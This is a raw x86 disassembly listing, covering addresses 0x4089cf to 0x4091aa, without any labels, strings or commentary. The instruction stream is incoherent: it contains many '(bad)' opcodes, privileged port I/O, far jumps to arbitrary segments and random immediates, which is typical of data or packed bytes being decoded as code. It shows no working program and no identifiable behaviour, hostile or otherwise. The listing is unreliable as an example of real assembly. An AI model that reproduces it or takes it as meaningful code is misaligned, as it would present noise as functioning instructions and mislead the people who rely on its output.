  4089cf:	sbb    ch,BYTE PTR [eax]
  4089d1:	cmp    BYTE PTR [ecx],al
  4089d3:	leave  
  4089d4:	rcr    DWORD PTR [esi+0x46e46755],cl
  4089da:	arpl   WORD PTR [ebp+0x370ac64f],bp
  4089e0:	dec    eax
  4089e1:	sub    al,BYTE PTR [esp+esi*2]
  4089e4:	sub    eax,0xfbf5c50d
  4089e9:	addr16 aam 0x4d
  4089ec:	adc    dh,BYTE PTR [edx+0x8682d49]
  4089f2:	sbb    al,0x3e
  4089f4:	stc    
  4089f5:	cmovg  edx,DWORD PTR [edi+0x4f]
  4089f9:	rol    DWORD PTR [edi+ebp*8],0x1c
  4089fd:	outs   dx,DWORD PTR ds:[esi]
  4089fe:	adc    DWORD PTR [esi-0x7a539d8b],edi
  408a04:	push   0xffffffe9
  408a06:	inc    ebp
  408a07:	dec    esi
  408a08:	bnd jle 0x408a31
  408a0b:	add    al,0x10
  408a0d:	push   ss
  408a0e:	cwde   
  408a0f:	mov    bl,0x2b
  408a11:	rcr    ah,0x1b
  408a14:	inc    DWORD PTR [edx+0x30]
  408a17:	mov    esi,0x3e05d6a6
  408a1c:	push   esi
  408a1d:	pop    eax
  408a1e:	push   ecx
  408a1f:	xor    BYTE PTR [ebp+0x50],dl
  408a22:	popf   
  408a23:	mov    edi,0x7162de65
  408a28:	and    eax,0xd6448ae2
  408a2d:	(bad)  
  408a2f:	stc    
  408a30:	loopne 0x408aa6
  408a32:	ficomp WORD PTR [ecx]
  408a34:	sar    DWORD PTR [edi],1
  408a36:	sbb    DWORD PTR [esi],edi
  408a38:	scas   eax,DWORD PTR es:[edi]
  408a39:	xor    DWORD PTR ds:0x6414e2a9,ecx
  408a3f:	xchg   esp,eax
  408a40:	xchg   ecx,eax
  408a41:	sub    DWORD PTR [eax+0x37],eax
  408a44:	in     al,dx
  408a45:	stos   BYTE PTR es:[edi],al
  408a46:	xchg   esi,eax
  408a47:	mov    bh,0xf1
  408a49:	mov    BYTE PTR [esi],dh
  408a4b:	mov    ch,0x9
  408a4d:	ret    0x330f
  408a50:	imul   esi,DWORD PTR [esp+eiz*4-0x7bbb9b7f],0x7b10394b
  408a5b:	scas   eax,DWORD PTR es:[edi]
  408a5c:	std    
  408a5d:	hlt    
  408a5e:	push   ebp
  408a5f:	test   DWORD PTR [edi+0x1fc186e9],edi
  408a65:	pop    edi
  408a66:	push   ecx
  408a67:	hlt    
  408a68:	jns    0x408ace
  408a6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a6b:	or     DWORD PTR [esi],edx
  408a6d:	and    bl,BYTE PTR [edi+0x76e8c0a0]
  408a73:	iret   
  408a74:	fdiv   QWORD PTR [edi]
  408a76:	out    dx,eax
  408a77:	pop    edx
  408a78:	scas   eax,DWORD PTR es:[edi]
  408a79:	mov    ds:0x9ca5b072,al
  408a7e:	sub    DWORD PTR [edi],esp
  408a80:	push   edi
  408a81:	mov    ecx,DWORD PTR [edx]
  408a83:	jno    0x408a7e
  408a85:	loope  0x408a1b
  408a87:	and    DWORD PTR [edi],eax
  408a89:	mov    ecx,0xef72dff4
  408a8e:	ror    BYTE PTR [ebp+edx*2-0x1c62d7a0],0xf5
  408a96:	jo     0x408a33
  408a98:	jl     0x408a75
  408a9a:	js     0x408abe
  408a9c:	jmp    0x4f2b1767
  408aa1:	(bad)  
  408aa2:	gs jae 0x408a68
  408aa5:	js     0x408b05
  408aa7:	lods   al,BYTE PTR ds:[esi]
  408aa8:	icebp  
  408aa9:	mov    esi,0x5cf14a58
  408aae:	scas   al,BYTE PTR es:[edi]
  408aaf:	sbb    BYTE PTR [edi+ebx*1+0x489cdf68],0xd3
  408ab7:	mov    al,ds:0x7d0ba745
  408abc:	test   esi,0xfc9add63
  408ac2:	lods   al,BYTE PTR ds:[esi]
  408ac3:	ret    0xa8f6
  408ac6:	fisubr DWORD PTR [esi-0x3f]
  408ac9:	cmp    BYTE PTR [edx+0x1a],ah
  408acc:	ss std 
  408ace:	mov    cl,0xe5
  408ad0:	xor    eax,0x1f502430
  408ad5:	push   ecx
  408ad6:	or     eax,0x9527f08a
  408adb:	jmp    0x19a9:0x12255514
  408ae2:	(bad)  
  408ae4:	jb     0x408b2b
  408ae6:	in     eax,dx
  408ae7:	leave  
  408ae8:	jl     0x408ab0
  408aea:	call   0x3f23393d
  408aef:	ins    DWORD PTR es:[edi],dx
  408af0:	inc    ecx
  408af1:	sub    ebp,0xffffffcb
  408af4:	push   0xa06a9988
  408af9:	and    eax,0x1f5fe94
  408afe:	aaa    
  408aff:	adc    esp,DWORD PTR [eax+0x51]
  408b02:	test   eax,0x57e7e0c0
  408b07:	dec    ecx
  408b08:	jecxz  0x408b50
  408b0a:	das    
  408b0b:	js     0x408ab4
  408b0d:	adc    al,0x33
  408b0f:	and    bh,BYTE PTR [eax]
  408b11:	lea    ebp,[edx-0x7f]
  408b14:	aas    
  408b15:	outs   dx,DWORD PTR ds:[esi]
  408b16:	adc    DWORD PTR [ecx+edi*1-0x6c],eax
  408b1a:	ins    DWORD PTR es:[edi],dx
  408b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b1c:	enter  0xa9c9,0x94
  408b20:	out    0x65,al
  408b22:	jb     0x408b7a
  408b24:	dec    edx
  408b25:	jmp    0x408b90
  408b27:	inc    ah
  408b29:	enter  0xa22,0x13
  408b2d:	and    bl,al
  408b2f:	mov    DWORD PTR [ebp+edi*2-0x26],0xb0cbe0c3
  408b37:	retf   
  408b38:	enter  0x4097,0x40
  408b3c:	imul   edx,DWORD PTR [ebp+0x1f],0x4e675db0
  408b43:	cmp    al,0xe
  408b45:	sub    al,0xb8
  408b47:	(bad)  
  408b48:	js     0x408b97
  408b4a:	xchg   esp,eax
  408b4b:	adc    ecx,DWORD PTR [esi+esi*2+0x39]
  408b4f:	and    al,cl
  408b51:	pop    edx
  408b52:	fs test eax,0x57f423fd
  408b58:	lds    esp,FWORD PTR [ebp+0x31bad46e]
  408b5e:	test   al,0x57
  408b60:	mov    ch,0x56
  408b62:	or     edi,DWORD PTR [edi+0x36]
  408b65:	mov    esi,0xcc85584b
  408b6a:	test   bl,dh
  408b6c:	stos   BYTE PTR es:[edi],al
  408b6d:	mov    ebx,DWORD PTR [eax+0x14de54aa]
  408b73:	repnz mov al,ds:0xda02b901
  408b79:	scas   al,BYTE PTR es:[edi]
  408b7a:	inc    ebx
  408b7b:	test   al,0x37
  408b7d:	xchg   ecx,eax
  408b7e:	enter  0xd314,0x22
  408b82:	pop    ds
  408b83:	push   ds
  408b84:	push   bx
  408b86:	sub    BYTE PTR [edx+0x6a],ah
  408b89:	test   eax,0x5339ae06
  408b8e:	scas   eax,DWORD PTR es:[edi]
  408b8f:	adc    eax,0x7865a649
  408b94:	ret    
  408b95:	add    eax,0xd3f85bd
  408b9a:	cmp    DWORD PTR [esp],ecx
  408b9d:	ss or  al,0xaf
  408ba0:	xchg   edi,eax
  408ba1:	cmp    dh,BYTE PTR [esi]
  408ba3:	xor    DWORD PTR [esi],esi
  408ba5:	inc    ecx
  408ba6:	xchg   ecx,eax
  408ba7:	les    ecx,FWORD PTR [ecx-0x3e7ef3d2]
  408bad:	jmp    0x439:0xca002b91
  408bb4:	push   edx
  408bb5:	lods   al,BYTE PTR ds:[esi]
  408bb6:	(bad)  
  408bb7:	jg     0x408bb9
  408bb9:	jle    0x408b98
  408bbb:	sbb    bl,ah
  408bbd:	mov    ds:0x34f1ae46,al
  408bc2:	push   eax
  408bc3:	sub    DWORD PTR [ecx+0x609d9eca],ebp
  408bc9:	mov    edx,0xba581582
  408bce:	xlat   BYTE PTR ds:[ebx]
  408bcf:	scas   eax,DWORD PTR es:[edi]
  408bd0:	sub    bl,dh
  408bd2:	xor    DWORD PTR [edi],eax
  408bd4:	sbb    DWORD PTR ds:0x6238913e,edx
  408bda:	ret    0x25b1
  408bdd:	adc    dl,BYTE PTR [esi]
  408bdf:	(bad)
  408be3:	shl    BYTE PTR [ebx+edi*1-0x62b89b5e],0xb6
  408beb:	jp     0x408bb6
  408bed:	push   ecx
  408bee:	lea    esp,[edi+eiz*4-0x3807f23f]
  408bf5:	cmp    BYTE PTR [ecx-0x39],dl
  408bf8:	mov    edi,edi
  408bfa:	pop    ds
  408bfb:	jo     0x408c48
  408bfd:	pop    es
  408bfe:	clc    
  408bff:	(bad)  
  408c00:	in     eax,0x55
  408c02:	mov    ebp,0x3d2c3d2d
  408c07:	aad    0x57
  408c09:	jbe    0x408c42
  408c0b:	adc    ch,BYTE PTR [eax]
  408c0d:	rol    DWORD PTR [esi],1
  408c0f:	int3   
  408c10:	xor    cl,BYTE PTR [edx]
  408c12:	(bad)  
  408c13:	call   0x5da1f12
  408c18:	jecxz  0x408c2a
  408c1a:	mov    edx,0xc29a5fd5
  408c1f:	ss inc edi
  408c21:	ficom  WORD PTR [eax+0x157c06d3]
  408c27:	fnstenv [ebp+ebp*2-0x4c]
  408c2b:	adc    al,0x44
  408c2d:	and    bh,BYTE PTR [ebp-0x4172c522]
  408c33:	mov    eax,ds:0x53a0fc38
  408c38:	and    al,0x53
  408c3a:	mov    ebp,0xd4db04e9
  408c3f:	pop    ecx
  408c40:	js     0x408bcb
  408c42:	push   eax
  408c43:	xor    bh,BYTE PTR [edi+0x24a005dc]
  408c49:	lock bound edi,QWORD PTR [ebp+0x1d]
  408c4d:	cld    
  408c4e:	mov    dl,0x56
  408c50:	(bad)  
  408c52:	xchg   esp,eax
  408c53:	popf   
  408c54:	mov    ds:0x7ea07273,eax
  408c59:	(bad)  
  408c5a:	mov    edx,0xc950f7e3
  408c5f:	ficom  WORD PTR ds:0x9412b0c2
  408c65:	dec    esp
  408c66:	jnp    0x408ccd
  408c68:	adc    al,0x3b
  408c6a:	push   DWORD PTR [ecx]
  408c6c:	sub    dh,BYTE PTR [edi-0xc]
  408c6f:	std    
  408c70:	sahf   
  408c71:	jmp    0x408c78
  408c73:	daa    
  408c74:	and    DWORD PTR [esi+eiz*4+0x5a],edi
  408c78:	int3   
  408c79:	je     0x408cb5
  408c7b:	hlt    
  408c7c:	cmp    BYTE PTR [eax-0x1b],bh
  408c7f:	pop    esp
  408c80:	jae    0x408c90
  408c82:	(bad)  
  408c83:	sbb    bl,dh
  408c85:	fwait
  408c86:	out    0xb7,eax
  408c88:	jecxz  0x408cf5
  408c8a:	idiv   dl
  408c8c:	pusha  
  408c8d:	sbb    ch,al
  408c8f:	enter  0x9aba,0x90
  408c93:	das    
  408c94:	cwde   
  408c95:	ins    BYTE PTR es:[edi],dx
  408c96:	and    edx,DWORD PTR [esi+0x2f]
  408c99:	fsubr  st(4),st
  408c9b:	or     edi,ebx
  408c9d:	aam    0x6c
  408c9f:	cmp    dh,BYTE PTR [eax+0x30]
  408ca2:	(bad)  
  408ca3:	push   ebp
  408ca4:	ss (bad) 
  408ca7:	pop    edi
  408ca8:	test   eax,0xd11153e0
  408cad:	cmp    DWORD PTR [esi-0x610ebca0],ebp
  408cb3:	(bad)  
  408cb4:	mov    fs,WORD PTR [ebx-0x27641b62]
  408cba:	icebp  
  408cbb:	ffreep st(0)
  408cbd:	adc    eax,0xfa474a0f
  408cc2:	shl    DWORD PTR [esi+0x6d],0xe3
  408cc6:	mov    al,0x2b
  408cc8:	add    BYTE PTR [esi-0x44343beb],al
  408cce:	icebp  
  408ccf:	in     al,0x70
  408cd1:	loop   0x408ce1
  408cd3:	sub    BYTE PTR [edi-0x3631b73f],ah
  408cd9:	mov    ebp,DWORD PTR [eax]
  408cdb:	dec    edi
  408cdc:	jo     0x408d1d
  408cde:	outs   dx,DWORD PTR ds:[esi]
  408cdf:	pop    eax
  408ce0:	(bad)  
  408ce1:	mov    ecx,ebp
  408ce3:	icebp  
  408ce4:	jge    0x408c7c
  408ce6:	mov    edx,0x7d5652a8
  408ceb:	mov    al,ds:0x2dfe2287
  408cf0:	lock je 0x408cbb
  408cf3:	mov    esp,0xb04bb5c7
  408cf8:	arpl   WORD PTR [edi+eiz*4],bp
  408cfb:	lahf   
  408cfc:	dec    ebx
  408cfd:	mov    ch,0xe8
  408cff:	adc    eax,0x57b3c1ee
  408d04:	pop    esp
  408d05:	(bad)  
  408d06:	and    BYTE PTR [ebx+0x285533f2],dh
  408d0c:	pushf  
  408d0d:	push   DWORD PTR [ebx]
  408d0f:	jbe    0x408d0d
  408d11:	retf   0x16b4
  408d14:	add    BYTE PTR [ebx+0x1f89fe6e],0x69
  408d1b:	push   0xffffffc8
  408d1d:	mov    ebx,0xe226b80
  408d22:	imul   edi,ebx,0x42581886
  408d28:	es inc edi
  408d2a:	ds loop 0x408d96
  408d2d:	sbb    bh,bl
  408d2f:	test   eax,0xc1cdef00
  408d34:	jp     0x408da0
  408d36:	cmp    eax,0xe1cad245
  408d3b:	retf   0x73dd
  408d3e:	xor    ah,bh
  408d40:	cmc    
  408d41:	cmc    
  408d42:	jp     0x408d9a
  408d44:	dec    eax
  408d45:	pop    ecx
  408d46:	pop    ebx
  408d47:	adc    DWORD PTR [ebx],ebx
  408d49:	xchg   esi,eax
  408d4a:	add    BYTE PTR [eax+0x3abca842],ch
  408d50:	cmp    BYTE PTR [esp+edx*2+0x3450df75],0x61
  408d58:	cmp    al,0x44
  408d5a:	cmc    
  408d5b:	mov    ecx,0x88179bdc
  408d60:	ja     0x408d5f
  408d62:	sbb    BYTE PTR [ebp-0x48],0x37
  408d66:	clc    
  408d67:	into   
  408d68:	std    
  408d69:	lock dec ebx
  408d6b:	dec    ebx
  408d6c:	cmc    
  408d6d:	(bad)  
  408d6e:	out    dx,al
  408d6f:	cmp    BYTE PTR [edx+edx*4+0x4e],cl
  408d73:	push   0x36
  408d75:	sub    eax,DWORD PTR [ebp+0x29]
  408d78:	xor    al,0x30
  408d7a:	(bad)  
  408d7b:	lock enter 0x2e7c,0x15
  408d80:	xchg   BYTE PTR [eax+0x32],bh
  408d83:	push   0xffffffd0
  408d85:	fmul   QWORD PTR [eax-0x7a566ffa]
  408d8b:	pop    ecx
  408d8c:	xor    edx,esp
  408d8e:	ror    DWORD PTR [ebp+0x22],1
  408d91:	enter  0x92c4,0xab
  408d95:	pop    edi
  408d96:	push   cs
  408d97:	mov    gs,WORD PTR [eax-0xce681ad]
  408d9d:	xchg   BYTE PTR [ecx],bh
  408d9f:	pop    ebx
  408da0:	push   edx
  408da1:	fisub  DWORD PTR [ebx+0x23]
  408da4:	cmp    BYTE PTR cs:[esi+edx*1-0x218c089],ah
  408dac:	fwait
  408dad:	test   BYTE PTR [ecx],bh
  408daf:	fisub  DWORD PTR [ebx]
  408db1:	ja     0x408db5
  408db3:	test   dl,dl
  408db5:	ins    BYTE PTR es:[edi],dx
  408db6:	push   ss
  408db7:	int3   
  408db8:	dec    esi
  408db9:	(bad)  
  408dba:	retf   
  408dbb:	and    eax,0x79fe27df
  408dc0:	sub    eax,0x117f1da9
  408dc5:	outs   dx,DWORD PTR ds:[esi]
  408dc6:	jge    0x408e17
  408dc8:	mov    eax,0x2bcac255
  408dcd:	mov    ds:0x17380b2e,eax
  408dd2:	ja     0x408dc8
  408dd4:	addr16 clc 
  408dd6:	jle    0x408dd2
  408dd8:	(bad)  
  408dd9:	pop    ebx
  408dda:	fadd   DWORD PTR [esi]
  408ddc:	jmp    0xa6ef:0x16e5d90a
  408de3:	mov    BYTE PTR [eax+0x4a],0x73
  408de7:	xchg   ebp,eax
  408de8:	mov    bl,0xc5
  408dea:	mov    ds:0xb53d469c,al
  408def:	cs clc 
  408df1:	(bad)  
  408df2:	sub    al,BYTE PTR [edi]
  408df4:	(bad)  
  408df5:	adc    esi,DWORD PTR [edi+0x74]
  408df8:	gs scas eax,DWORD PTR es:[edi]
  408dfa:	xchg   ebp,eax
  408dfb:	adc    ecx,0x2a
  408dfe:	cdq    
  408dff:	add    DWORD PTR [edi],ebp
  408e01:	mov    ds:0x688a3d8d,al
  408e06:	sub    cl,BYTE PTR ds:0xae9c5db
  408e0c:	inc    edx
  408e0d:	sar    DWORD PTR [edi-0x4f],cl
  408e10:	sub    BYTE PTR [ebx-0x35],dh
  408e13:	jp     0x408dd2
  408e15:	mov    eax,ds:0xc5819a3b
  408e1a:	jno    0x408e11
  408e1c:	mov    ecx,0xa4c8cacf
  408e21:	in     al,dx
  408e22:	rcr    bh,cl
  408e24:	and    dl,0x24
  408e27:	xchg   ebp,eax
  408e28:	cs sub eax,0xdd982231
  408e2e:	inc    esi
  408e2f:	(bad)  
  408e31:	pusha  
  408e32:	shl    DWORD PTR [ecx-0x76],0x5a
  408e36:	fs lock leave 
  408e39:	xor    eax,0xb7b0e3c9
  408e3e:	popf   
  408e3f:	mov    es,WORD PTR [edx+0x65]
  408e42:	rcr    bl,1
  408e44:	pop    ebp
  408e45:	fimul  DWORD PTR [ebp-0x50b9a5fa]
  408e4b:	(bad)  
  408e4c:	mov    bh,bh
  408e4e:	mov    ebx,esp
  408e50:	ror    BYTE PTR [ebx-0x45],cl
  408e53:	sbb    BYTE PTR [esi+0x28],ch
  408e56:	ret    0x4c2
  408e59:	outs   dx,DWORD PTR ds:[esi]
  408e5a:	jno    0x408e8d
  408e5c:	clc    
  408e5d:	mov    eax,ds:0x5a5e0afd
  408e62:	retf   
  408e63:	push   edx
  408e64:	jl     0x408eaf
  408e66:	lock into 
  408e68:	or     DWORD PTR ds:0x17067d4f,0x20f94e8c
  408e72:	test   DWORD PTR [ebx],ecx
  408e74:	jo     0x408ee2
  408e76:	mov    dh,cl
  408e78:	dec    eax
  408e79:	sub    al,0xb
  408e7b:	jns    0x408e0c
  408e7d:	add    BYTE PTR [eax+0x69],0x2c
  408e81:	jno    0x408e15
  408e83:	inc    esp
  408e84:	int3   
  408e85:	ds push esp
  408e87:	(bad)  
  408e88:	fldcw  WORD PTR [ecx+eiz*1-0x1f]
  408e8c:	dec    eax
  408e8d:	int3   
  408e8e:	fld    QWORD PTR [edi-0x3cbfb632]
  408e94:	scas   al,BYTE PTR es:[edi]
  408e95:	sub    eax,0x61594979
  408e9a:	out    dx,al
  408e9b:	imul   edx,DWORD PTR [ebx-0x3a],0xffffffa9
  408e9f:	cmp    BYTE PTR [edi+edi*4-0x30],0x5b
  408ea4:	je     0x408eae
  408ea6:	mov    ebp,0xacc19cf
  408eab:	push   ds
  408eac:	call   0x8283:0xc9f7264
  408eb3:	mov    edi,esp
  408eb5:	mov    eax,ds:0x3b834a3e
  408eba:	mov    ds:0xb9212c1f,eax
  408ebf:	int    0x5a
  408ec1:	cmc    
  408ec2:	lds    esp,FWORD PTR [edi+eax*1-0x53]
  408ec6:	cmovb  ebp,DWORD PTR [ecx+0x93a15f]
  408ecd:	fs mov esi,0xa5afd4c1
  408ed3:	(bad)  
  408ed4:	fld    TBYTE PTR [ebp+0x62]
  408ed7:	(bad)  
  408ed8:	repz sub eax,0xc26cc6ce
  408ede:	pminsw mm5,QWORD PTR [eax+esi*2]
  408ee2:	xrelease xchg BYTE PTR [ebx+0x5ec38bfa],dl
  408ee9:	lods   eax,DWORD PTR ds:[esi]
  408eea:	arpl   WORD PTR [ebx+0x6c],si
  408eed:	neg    esp
  408eef:	pop    edx
  408ef0:	mov    edx,0xa05f812d
  408ef5:	ror    BYTE PTR [ecx+0x20],cl
  408ef8:	jl     0x408e94
  408efa:	cmp    BYTE PTR [ebx-0x70],bl
  408efd:	mul    BYTE PTR [eax-0x1e584b65]
  408f03:	das    
  408f04:	ret    0x1afe
  408f07:	or     DWORD PTR [esi-0x62],ebx
  408f0a:	bswap  esp
  408f0c:	fwait
  408f0d:	xchg   ebp,eax
  408f0e:	retf   
  408f0f:	mov    al,0x53
  408f11:	add    ebp,DWORD PTR [ecx-0x4462533b]
  408f17:	jns    0x408f03
  408f19:	mov    es,WORD PTR ss:[edi+esi*2]
  408f1d:	or     DWORD PTR [bp+si+0x308a],esp
  408f22:	push   edi
  408f23:	mov    dl,0xd0
  408f25:	mov    al,0xf6
  408f27:	(bad)  
  408f28:	mov    DWORD PTR [eax-0x7b],eax
  408f2b:	scas   al,BYTE PTR es:[edi]
  408f2c:	xor    dh,BYTE PTR [ebx]
  408f2e:	add    eax,0x5edf157d
  408f33:	inc    eax
  408f34:	cs aaa 
  408f36:	dec    esp
  408f37:	clc    
  408f38:	mov    DWORD PTR [edi],ebp
  408f3a:	bound  edi,QWORD PTR [ebx+edx*8+0x54]
  408f3e:	call   0xc98f:0x5925b5ab
  408f45:	das    
  408f46:	stc    
  408f47:	fdivr  st,st(2)
  408f49:	popa   
  408f4a:	in     al,0xcd
  408f4c:	outs   dx,DWORD PTR ds:[esi]
  408f4d:	xchg   esp,eax
  408f4e:	pop    ecx
  408f4f:	pop    esp
  408f50:	adc    al,0xfc
  408f52:	jmp    0x21f2:0x8c7e36f8
  408f59:	(bad)  
  408f5a:	pop    ebx
  408f5b:	push   eax
  408f5c:	repnz in eax,0xd
  408f5f:	xchg   BYTE PTR [ebp+0x5bf21626],dh
  408f65:	sbb    al,BYTE PTR [ebx]
  408f67:	rcr    DWORD PTR [esi+0x44e24f6a],cl
  408f6d:	(bad)  
  408f6e:	fisub  DWORD PTR [ebp+0x66]
  408f71:	xchg   edi,eax
  408f72:	jo     0x408fb6
  408f74:	mov    al,ds:0xd5f8839c
  408f79:	push   ebp
  408f7a:	fcom   DWORD PTR [edi]
  408f7c:	sub    DWORD PTR [eax],esp
  408f7e:	pop    ebx
  408f7f:	sub    DWORD PTR [eax+0x19],esp
  408f82:	or     eax,0xe9fe97f5
  408f87:	cmp    al,0x63
  408f89:	mov    eax,0x19bae5de
  408f8e:	fwait
  408f8f:	and    DWORD PTR [esi],eax
  408f91:	push   es
  408f92:	push   0xffffffd7
  408f94:	call   0xeeae2fa1
  408f99:	cmp    bh,bl
  408f9b:	mov    edi,0x1810db3c
  408fa0:	outs   dx,BYTE PTR ds:[esi]
  408fa1:	pop    esp
  408fa2:	jp     0x408f84
  408fa4:	lock leave 
  408fa6:	and    al,0x59
  408fa8:	pop    esi
  408fa9:	xchg   ecx,eax
  408faa:	xor    DWORD PTR [ecx+esi*1],edi
  408fad:	push   ds
  408fae:	fnstsw WORD PTR [esi]
  408fb0:	cmp    eax,0x94699e6d
  408fb5:	popf   
  408fb6:	shr    BYTE PTR [esi-0xc5e40c],1
  408fbc:	leave  
  408fbd:	jmp    0x5808f561
  408fc2:	sub    BYTE PTR [ecx+0x6cf5ac37],ah
  408fc8:	ffree  st(1)
  408fca:	cmp    DWORD PTR [edi+0x7d46b969],esp
  408fd0:	test   DWORD PTR [esi],ecx
  408fd2:	dec    ebx
  408fd3:	retf   0x75c4
  408fd6:	clc    
  408fd7:	arpl   cx,cx
  408fd9:	jns    0x40900e
  408fdb:	jbe    0x408fdc
  408fdd:	jg     0x40901c
  408fdf:	jae    0x409006
  408fe1:	popf   
  408fe2:	sbb    eax,0x982920f1
  408fe7:	imul   esi,edx,0x1c49f775
  408fed:	or     dl,BYTE PTR [edx]
  408fef:	(bad)  
  408ff0:	push   esi
  408ff1:	jb     0x40900e
  408ff3:	(bad)  
  408ff4:	and    ch,bl
  408ff6:	and    al,0xc5
  408ff8:	push   es
  408ff9:	cmc    
  408ffa:	adc    bl,BYTE PTR [ebx+ebp*4]
  408ffd:	scas   al,BYTE PTR es:[edi]
  408ffe:	test   al,0x9
  409000:	cmc    
  409001:	push   edi
  409002:	jmp    0x408fa0
  409004:	xor    al,0x65
  409006:	retf   0x2af2
  409009:	inc    eax
  40900a:	sahf   
  40900b:	loop   0x409018
  40900d:	popa   
  40900e:	ficom  WORD PTR [edi+0x281a2146]
  409014:	test   eax,0x83e39619
  409019:	(bad)  
  40901a:	push   esp
  40901b:	add    DWORD PTR [edi+0x63],esp
  40901e:	ret    
  40901f:	sbb    cl,BYTE PTR [ebx+0x41ba79b2]
  409025:	mov    ebp,0xba53015f
  40902a:	dec    esi
  40902b:	out    0xa2,eax
  40902d:	jg     0x409055
  40902f:	jnp    0x408fcb
  409031:	js     0x409046
  409033:	fst    st(7)
  409035:	cld    
  409036:	idiv   BYTE PTR [edx+edx*8-0x64]
  40903a:	retf   
  40903b:	mov    BYTE PTR ds:0x735a5e7,dl
  409041:	xor    ebx,ebp
  409043:	sub    DWORD PTR [ebx],ecx
  409045:	pop    edx
  409046:	mov    BYTE PTR [edi],cl
  409048:	fwait
  409049:	xchg   ah,dh
  40904b:	adc    DWORD PTR [ebx+0x45958149],0x62f27c69
  409055:	xchg   edi,eax
  409056:	inc    ebx
  409057:	cmp    BYTE PTR [ebx],dl
  409059:	xor    dh,dl
  40905b:	das    
  40905c:	push   cs
  40905d:	jne    0x409015
  40905f:	pop    es
  409060:	sbb    eax,0x647ac02
  409065:	aam    0xd5
  409067:	or     al,0xed
  409069:	mov    bl,0x27
  40906b:	rcr    BYTE PTR [ebx*1-0x261b1eff],1
  409072:	cmp    cl,ch
  409074:	adc    al,0xd1
  409076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409077:	mov    DWORD PTR [esi-0x1a33f1a9],esp
  40907d:	(bad)  
  40907f:	pop    ds
  409080:	imul   DWORD PTR [ebx-0x61]
  409083:	in     al,0x2c
  409085:	jecxz  0x409045
  409087:	or     al,0x76
  409089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40908a:	and    ch,ah
  40908c:	ret    0x3258
  40908f:	xchg   BYTE PTR [eax],bh
  409091:	sbb    edx,DWORD PTR [ecx+ebp*2+0xb]
  409095:	or     al,0xb2
  409097:	adc    esi,DWORD PTR [eax+0x2b]
  40909a:	das    
  40909b:	pop    ds
  40909c:	inc    ebp
  40909d:	pop    ecx
  40909e:	mov    al,ds:0x38f1e008
  4090a3:	xor    al,0x47
  4090a5:	sbb    esi,DWORD PTR [ecx+edx*4]
  4090a8:	sub    esp,DWORD PTR [edx-0x48]
  4090ab:	(bad)  
  4090ac:	pop    ds
  4090ad:	out    0xf6,eax
  4090af:	stc    
  4090b0:	inc    ebp
  4090b1:	push   0x72
  4090b3:	dec    ecx
  4090b4:	ins    DWORD PTR es:[edi],dx
  4090b5:	ficomp WORD PTR [ecx-0x783d379e]
  4090bb:	aaa    
  4090bc:	mov    gs,WORD PTR [eax-0x1]
  4090bf:	xor    dh,bh
  4090c1:	add    al,0xaa
  4090c3:	xchg   ebx,eax
  4090c4:	or     dh,dh
  4090c6:	jno    0x40907f
  4090c8:	push   0x451f2705
  4090cd:	mov    edx,0x168afe79
  4090d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090d3:	rol    ebp,1
  4090d5:	dec    esp
  4090d6:	test   eax,0x2ee2a697
  4090db:	mov    cl,BYTE PTR [eax]
  4090dd:	cs loop 0x409132
  4090e0:	outs   dx,DWORD PTR ds:[esi]
  4090e1:	fs cld 
  4090e3:	jo     0x409067
  4090e5:	outs   dx,DWORD PTR ds:[esi]
  4090e6:	or     ebx,ebp
  4090e8:	inc    edx
  4090e9:	jge    0x4090f8
  4090eb:	das    
  4090ec:	push   esi
  4090ed:	mov    al,0x2b
  4090ef:	ins    DWORD PTR es:[edi],dx
  4090f0:	mov    cl,al
  4090f2:	jno    0x409075
  4090f4:	daa    
  4090f5:	jbe    0x40913f
  4090f7:	das    
  4090f8:	loopne 0x409174
  4090fa:	ds jge 0x409132
  4090fd:	xor    al,0x8
  4090ff:	dec    ebx
  409100:	pop    ebx
  409101:	and    BYTE PTR [ebp-0x51],0xf3
  409105:	pop    ss
  409106:	sbb    al,0xb8
  409108:	(bad)
  40910b:	in     eax,0xe0
  40910d:	lods   eax,DWORD PTR ds:[esi]
  40910e:	or     dl,dh
  409110:	dec    esp
  409111:	pop    edx
  409112:	push   es
  409113:	mov    WORD PTR [ebp+0x44],fs
  409116:	xchg   DWORD PTR [ecx+esi*2],ebx
  409119:	ror    DWORD PTR [eax+0x552c2e8],1
  40911f:	out    dx,eax
  409120:	jg     0x40910f
  409122:	xor    DWORD PTR [esi],eax
  409124:	or     BYTE PTR [ebx+0x5d],ch
  409127:	ror    esp,cl
  409129:	mov    eax,ds:0xd4def2d5
  40912e:	or     esi,DWORD PTR [esi]
  409130:	scas   al,BYTE PTR es:[edi]
  409131:	aam    0xb9
  409133:	repnz pop ecx
  409135:	adc    al,0x31
  409137:	xor    DWORD PTR [edx],0x39
  40913a:	rcl    DWORD PTR [ebp+0x4a4ff4a],1
  409140:	xor    bl,bl
  409142:	inc    esp
  409143:	sub    DWORD PTR [ecx+0x72a045cb],esp
  409149:	mov    ah,0xa6
  40914b:	inc    ecx
  40914c:	xor    edx,esp
  40914e:	int    0xb4
  409150:	sub    eax,0x846597e4
  409155:	jmp    0xd857:0x2449ad48
  40915c:	cmp    ebp,eax
  40915e:	dec    ebx
  40915f:	pop    esi
  409160:	mov    esi,0xadc41d40
  409165:	jns    0x409153
  409167:	ret    0x223c
  40916a:	xchg   esi,eax
  40916b:	enter  0xb7f1,0x4e
  40916f:	xchg   esp,eax
  409170:	sub    ecx,DWORD PTR [ebp-0x754fc6ca]
  409176:	add    al,0xc
  409178:	add    ebp,DWORD PTR [ebx+0xba4527e]
  40917e:	mov    WORD PTR ds:0xb58482a6,ds
  409184:	or     edi,DWORD PTR ds:0x9323cfbe
  40918a:	out    dx,al
  40918b:	je     0x40918e
  40918d:	xlat   BYTE PTR ds:[ebx]
  40918e:	adc    DWORD PTR [edx+0x11cb1a0b],edx
  409194:	scas   al,BYTE PTR es:[edi]
  409195:	rcr    BYTE PTR [ebx-0x1e349fa3],cl
  40919b:	test   ebx,eax
  40919d:	pop    eax
  40919e:	push   0xbaca2a08
  4091a3:	cmp    esp,DWORD PTR [ebp+0x329c8b91]
  4091a9:	push   esp
  4091aa:	mov    eax,ds:0xd3dc32d9
